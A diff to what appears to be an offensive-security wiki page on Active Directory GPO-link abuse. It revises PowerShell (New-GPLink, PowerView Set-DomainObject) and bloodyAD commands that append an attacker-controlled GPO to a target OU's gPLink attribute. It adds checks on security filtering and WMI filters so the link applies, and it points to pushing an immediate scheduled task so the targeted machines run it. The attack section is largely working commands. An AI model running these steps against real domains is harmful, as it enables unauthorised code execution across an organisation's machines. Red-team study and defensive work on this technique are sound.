@@ -15,22 +15,27 @@ Editing a GPO needs write access to that GPO. **Linking** needs only write acces
 
 ## The attack
 
-You need two things: write over the target OU's `gPLink`, and a GPO whose contents you control.
+You need write over the target OU's `gPLink` and a GPO whose contents you control, and the GPO must actually **apply** to the targets: its security filtering has to grant the target users/computers **Read + Apply Group Policy** (the default `Authenticated Users` does, a custom filter may not), and any **WMI filter** on it must evaluate true for them. Check both before relying on the link.
+
+`gPLink` is a **single string** of concatenated `[DN;flags]` entries, so you must **append** your entry, not overwrite the attribute: a bare write replaces the value and silently unlinks every GPO already on the OU (likely breaking production policy). `New-GPLink` appends safely; raw LDAP writes must read-modify-write.
 
 ```powershell
-# RSAT / Group Policy module: link an existing GPO to the target OU
+# RSAT / Group Policy module: safely ADDS a link, preserving existing ones
 New-GPLink -Name "Vulnerable GPO" -Target "OU=Workstations,DC=example,DC=local" -LinkEnabled Yes
 
-# PowerView: write the gPLink attribute directly
-Set-DomainObject -Identity 'OU=Workstations,DC=example,DC=local' `
-  -Set @{'gplink'='[LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=example,DC=local;0]'}
+# PowerView: -Set REPLACES, so read the current gPLink and append your entry
+$ou  = Get-DomainOU -Identity 'OU=Workstations,DC=example,DC=local' -Properties gplink
+$new = $ou.gplink + '[LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=example,DC=local;0]'
+Set-DomainObject -Identity 'OU=Workstations,DC=example,DC=local' -Set @{'gplink'=$new}
 ```
 
 ```bash
-# From Linux, set the OU gPLink over LDAP (bloodyAD)
+# From Linux: read the existing gPLink, then write back existing + new (never overwrite blind)
+bloodyAD --host <dc> -d example.local -u user -p pass get object \
+  'OU=Workstations,DC=example,DC=local' --attr gPLink      # capture current value
 bloodyAD --host <dc> -d example.local -u user -p pass set object \
   'OU=Workstations,DC=example,DC=local' gPLink \
-  -v '[LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=example,DC=local;0]'
+  -v '<existing-gplink>[LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=example,DC=local;0]'
 ```
 
 Then push an [immediate scheduled task into that GPO](editing-a-gpo.md) (or use a GPO that already carries one), and the newly-scoped machines run it.
